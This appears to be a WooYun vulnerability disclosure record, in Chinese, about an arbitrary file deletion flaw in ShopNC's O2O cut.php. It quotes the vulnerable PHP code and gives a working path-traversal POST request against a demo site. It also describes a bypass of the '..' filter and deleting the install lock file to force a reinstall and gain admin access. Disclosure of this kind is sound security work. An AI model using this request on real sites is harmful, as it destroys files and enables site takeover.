{"id": 49680, "wybug_id": "wooyun-2014-080462", "wybug_title": "shopNC O2O系统任意文件删除漏洞", "wybug_corp": "shopnc.net", "wybug_author": "phith0n", "wybug_date": "2014-10-23 18:45", "wybug_open_date": "2014-12-30 14:44", "wybug_type": "任意文件遍历/下载", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["文件操作不当", "任意删除文件"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-10-23：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-10-28：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-12-22：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-01-01：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-01-11：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-12-30：\t细节向公众公开  简要描述： 齐博齐博快确认，确认了我再送个0day~shopNC的任意文件删除挺多的，我拿O2O系统来说明问题吧。 详细说明：  /circle/control/cut.php 46行\n/**         * 图片裁剪         *         */        public function pic_cutOp(){                import('function.thumb');                if (chksubmit()){                        $thumb_width = $_POST['x'];                        $x1 = $_POST[\"x1\"];                        $y1 = $_POST[\"y1\"];                        $x2 = $_POST[\"x2\"];                        $y2 = $_POST[\"y2\"];                        $w = $_POST[\"w\"];                        $h = $_POST[\"h\"];                        $scale = $thumb_width/$w;                        $src = str_ireplace(UPLOAD_SITE_URL,BASE_UPLOAD_PATH,$_POST['url']);                        if (!empty($_POST['filename'])){                                $save_file2 = BASE_UPLOAD_PATH.'/'.$_POST['filename'];                        }else{                                $save_file2 = str_replace('_small.','_sm.',$src);                        }                        $cropped = resize_thumb($save_file2, $src,$w,$h,$x1,$y1,$scale);                        @unlink($src);                        $pathinfo = pathinfo($save_file2);                        exit($pathinfo['basename']);                            }                $save_file = str_ireplace(UPLOAD_SITE_URL,BASE_UPLOAD_PATH,$_GET['url']);                $_GET['x'] = (intval($_GET['x'])>50 && $_GET['x']<400) ? $_GET['x'] : 200;                $_GET['y'] = (intval($_GET['y'])>50 && $_GET['y']<400) ? $_GET['y'] : 200;                $_GET['resize'] = $_GET['resize'] == '0' ? '0' : '1';                Tpl::output('height',get_height($save_file));                Tpl::output('width',get_width($save_file));                Tpl::showpage('cut','null_layout');        }\n如上，获取了$_POST['url']并传入unlink函数，导致任意文件删除漏洞。我看了其他几处unlink，发现都有str_replace('..','',$src);，而这一处没有。我还顺便提供一个str_replace('..','',$src);的绕过方法吧，因为这里的删除代码是unlink($src);，$src如果是绝对路径的话，不需要..做跳转，所以也就能绕过这个str_replace。不过得先知道网站绝对路径才好(不过有个位置确实能爆绝对路径，不用开启php报错)，这里不提，单说/circle/control/cut.php的任意文件删除。官方测试站：http://www.o2olive.net/demo为了测试而且不破坏网站，我注册一个用户，上传一个头像，并删除之，来演示文件删除漏洞。\n\n上传头像，地址为http://www.o2olive.net/demo/data/upload/shop/member/avatar_375.jpg发送如下数据包删除之：http://www.o2olive.net/demo/circle/index.php?act=cut&op=pic_cutPOST：form_submit=ok&url=../data/upload/shop/member/avatar_375.jpg&w=1\n\n再看发现已经404了：\n\n通过任意文件删除漏洞，可以删除/install/lock文件，导致系统重装，获得管理员权限，并进一步提权。   漏洞证明：  见详细说明   修复方案：  过滤。   版权声明：转载请注明来源 phith0n@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-12-30 14:44 厂商回复：  最新状态： 2014-10-29：感谢，正在修复  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}